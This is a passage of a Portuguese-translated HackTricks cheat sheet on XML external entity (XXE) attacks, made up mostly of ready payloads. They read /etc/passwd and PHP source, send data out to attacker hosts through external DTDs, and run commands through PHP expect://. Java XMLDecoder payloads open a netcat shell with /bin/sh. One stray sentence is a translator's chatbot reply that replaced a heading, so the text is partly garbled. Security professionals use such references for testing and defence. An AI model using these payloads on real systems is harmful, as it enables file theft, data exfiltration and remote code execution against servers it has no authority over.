Se o site estiver usando PHP, em vez de usar `file:/`, voc√™ pode usar **envolvedores php** `php://filter/convert.base64-encode/resource=` para **acessar arquivos internos**.

Se o site estiver usando Java, voc√™ pode verificar o [**protocolo jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entidades HTML

Truque de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Voc√™ pode criar uma **entidade dentro de uma entidade** codificando-a com **entidades HTML** e depois cham√°-la para **carregar um dtd**.\
Observe que as **Entidades HTML** usadas precisam ser **num√©ricas** (como \[neste exemplo]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
    <env>&exfil;</env>
</data>
```
Exemplo de DTD:
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Inv√≥lucros PHP

### Base64

**Extrair** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extrair recurso externo**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Execu√ß√£o remota de c√≥digo

**Se o m√≥dulo "expect" do PHP estiver carregado**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

SOAP (Simple Object Access Protocol) √© um protocolo baseado em XML usado para acessar servi√ßos web. Ele usa XML para codificar sua mensagem e geralmente √© transportado usando HTTP.

Uma vulnerabilidade comum em servi√ßos SOAP √© a Inje√ß√£o de Entidade Externa XML (XEE). Isso ocorre quando o servi√ßo n√£o valida adequadamente as entradas XML recebidas, permitindo que um invasor injete uma entidade externa maliciosa que pode ser usada para ler arquivos do sistema ou executar c√≥digo arbitr√°rio.

Para explorar essa vulnerabilidade, um invasor pode enviar uma solicita√ß√£o SOAP contendo uma entidade externa maliciosa, como a seguinte:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://services.mycompany.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:getUser>
         <username>&xxe;</username>
      </ser:getUser>
   </soapenv:Body>
</soapenv:Envelope>
```

Nesse exemplo, a entidade externa `xxe` √© definida como o conte√∫do do arquivo `/etc/passwd`. Quando a solicita√ß√£o √© processada pelo servi√ßo, o conte√∫do do arquivo `/etc/passwd` √© inclu√≠do na resposta SOAP, permitindo que o invasor leia informa√ß√µes confidenciais do sistema.

Para evitar essa vulnerabilidade, √© importante validar adequadamente todas as entradas XML recebidas pelo servi√ßo e restringir o acesso a recursos do sistema.
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Esta se√ß√£o foi retirada de [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
De acordo com a [Wikipedia](https://en.wikipedia.org/wiki/XLIFF):

> XLIFF (XML Localization Interchange File Format) √© um formato de bitexto baseado em XML criado para padronizar a forma como os dados localiz√°veis s√£o passados entre e entre ferramentas durante um processo de localiza√ß√£o e um formato comum para a troca de ferramentas CAT.

### Solicita√ß√£o cega
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
O servidor responde com um erro:
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Mas tivemos um acerto no Burp Collaborator.

### Exfiltrando dados via Out of Band
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Com base no User Agent exibido pelo burp collaborator, parece que ele est√° usando **Java 1.8**. Um dos problemas ao explorar XXE nesta vers√£o do Java √© que **n√£o conseguimos obter arquivos contendo uma `Nova Linha`** como `/etc/passwd` usando a t√©cnica Out of Band.

### Exfiltrando dados via erro baseado

Arquivo DTD:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Desculpe, n√£o entendi o que voc√™ quer dizer com "Server Response:". Voc√™ pode me dar mais informa√ß√µes ou fazer uma nova solicita√ß√£o?
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
√ìtimo! O arquivo `non-exist` √© refletido nas mensagens de erro. O pr√≥ximo passo √© adicionar o conte√∫do do arquivo.

Arquivo DTD:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
E o conte√∫do do arquivo foi **impresso na sa√≠da do erro enviado via HTTP** com sucesso.

## RSS - XEE

XML v√°lido com formato RSS para explorar uma vulnerabilidade XXE.

### Ping back

Simples requisi√ß√£o HTTP para o servidor do atacante.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler arquivo

O ataque de Entidade Externa XML (XXE) pode ser usado para ler arquivos do sistema de arquivos do servidor. Para fazer isso, o atacante precisa criar um arquivo XML malicioso que contenha uma refer√™ncia a um arquivo no sistema de arquivos do servidor. Quando o servidor processa o arquivo XML, ele tenta resolver a refer√™ncia do arquivo e, se bem-sucedido, o conte√∫do do arquivo √© retornado na resposta.

Por exemplo, o seguinte XML malicioso pode ser usado para ler o arquivo `/etc/passwd` em um sistema Linux:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

O resultado da solicita√ß√£o incluir√° o conte√∫do do arquivo `/etc/passwd`. Esse tipo de ataque pode ser usado para obter informa√ß√µes confidenciais, como senhas de usu√°rio e chaves de API.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler c√≥digo fonte

Usando o filtro base64 do PHP
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE para RCE

XMLDecoder √© uma classe Java que cria objetos com base em uma mensagem XML. Se um usu√°rio mal-intencionado conseguir fazer com que um aplicativo use dados arbitr√°rios em uma chamada ao m√©todo **readObject**, ele instantaneamente ganhar√° execu√ß√£o de c√≥digo no servidor.

### Usando Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      </void>
 </object>
</java>
```
### ProcessBuilder

O `ProcessBuilder` √© uma classe Java que permite executar comandos em um novo processo. √â comumente usado para executar comandos do sistema operacional, como `ls` ou `dir`. No entanto, tamb√©m pode ser usado para executar comandos personalizados.

Um exemplo de uso do `ProcessBuilder` √© executar um comando que l√™ um arquivo XML e imprime seu conte√∫do no console. No entanto, se o arquivo XML contiver uma entidade externa, o `ProcessBuilder` pode ser usado para explorar uma vulnerabilidade de Inje√ß√£o de Entidade Externa (XXE).

Para explorar essa vulnerabilidade, o atacante pode criar um arquivo XML malicioso que contenha uma entidade externa que aponte para um arquivo no sistema do alvo. Quando o comando √© executado pelo `ProcessBuilder`, a entidade externa √© resolvida e o conte√∫do do arquivo √© inclu√≠do na sa√≠da do comando. Isso pode permitir que o atacante leia arquivos confidenciais no sistema do alvo.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0">
        <string>/usr/bin/nc</string>
      </void>
      <void index="1">
         <string>-l</string>
      </void>
      <void index="2">
         <string>-p</string>
      </void>
      <void index="3">
         <string>9999</string>
      </void>
      <void index="4">
         <string>-e</string>
      </void>
      <void index="5">
         <string>/bin/sh</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```
## Ferramentas

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Mais recursos

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
Extrair informa√ß√µes via HTTP usando DTD externo pr√≥prio: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
